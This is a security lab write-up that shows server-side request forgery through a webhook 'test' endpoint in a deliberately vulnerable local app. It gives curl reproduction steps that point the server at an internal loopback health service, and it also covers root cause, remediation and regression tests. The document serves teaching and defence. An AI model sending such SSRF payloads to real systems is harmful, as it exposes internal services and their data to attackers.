# Lab 22 — Webhook Tester SSRF to Internal Services

## 1. Objective

Demonstrate how an unconstrained webhook testing feature allows users to dispatch arbitrary HTTP requests to internal network services.

## 2. Scenario

A developer settings interface allows users to configure automated webhooks. Before saving a webhook URL, users can trigger a "Test Webhook" action (`/test-webhook`) to verify server-to-server connectivity. The application server issues an HTTP GET or POST request directly to the supplied URL and returns the response status code, headers, and body snippet to the user interface for troubleshooting.

**Trust boundary:** The application assumed that webhook test targets would point strictly to external third-party webhook receivers (such as Slack or Zapier).

## 3. Preconditions

| Item | Value |
|------|-------|
| Target endpoint | `/lab/ssrf/ssrf-02/test-webhook` |
| Mock internal service | `http://127.0.0.1:5001/internal/health` (or `http://mock-internal:5001`) |
| Authenticated user | `alice` / `alice123` |
| Seed state | Initial database seed (`POST /reset`) |

## 4. Vulnerability Mechanism

The endpoint extracts `url` from the request payload and directly performs an outbound HTTP request:

```python
resp = http_requests.get(url, timeout=5)
```

The server records the result in the `webhooks` table and reflects `resp.status_code`, `resp.headers`, and `resp.text` back to the client. Because no destination validation is performed, the server can be instructed to query internal admin panels, datastores, or health check endpoints.

## 5. Reproduction

1. Authenticate as `alice`:

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. Submit a webhook test payload targeting the internal service:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/ssrf/ssrf-02/test-webhook \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5001/internal/health"}'
```

3. Review the returned response attributes.

## 6. Evidence

The response contains the full HTTP status code and response payload from the internal endpoint:

```json
{
  "headers": {
    "Content-Length": "44",
    "Content-Type": "application/json"
  },
  "response_body": "{\"service\": \"internal-api\", \"status\": \"healthy\"}",
  "status_code": 200
}
```

The tester endpoint acted as an open HTTP proxy into the internal network.

## 7. Root Cause

**File:** `app/routes/ssrf.py`  
**Function:** `lab22_test_webhook()`

In unpatched mode, the destination URL is fetched without network boundary checks or IP validation:

```python
if patched:
    safe, reason = _is_url_safe(url)
    if not safe:
        return jsonify({'error': f'URL blocked: {reason}'}), 403
```

## 8. Impact

An attacker can execute full HTTP request testing against internal microservices, port scan internal RFC 1918 subnets, and exfiltrate responses returned by internal APIs.

## 9. Remediation

Validate all webhook URLs against private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`) and loopback destinations before issuing requests:

```python
safe, reason = _is_url_safe(url)
if not safe:
    return jsonify({'error': f'URL blocked: {reason}'}), 403
```

Additionally, dispatch webhook deliveries through a dedicated, egress-restricted proxy service.

## 10. Regression Validation

**Test:** `tests/test_lab_22.py`

- **Vulnerable mode:** Internal target returns HTTP 200 with `response_body` containing `internal-api`.
- **Patched mode:** Internal target returns HTTP 403 with `URL blocked`.
- **Legitimate flow:** Empty URL is rejected with HTTP 400.

## 11. Research Discussion

1. Why are developer webhook tools and integration test features particularly vulnerable to SSRF attacks?
2. How can asynchronous background task queues (e.g., Celery, BullMQ) complicate SSRF prevention if validation is only performed at submission time?
3. What egress network controls should be placed on workers responsible for dispatching external webhooks?
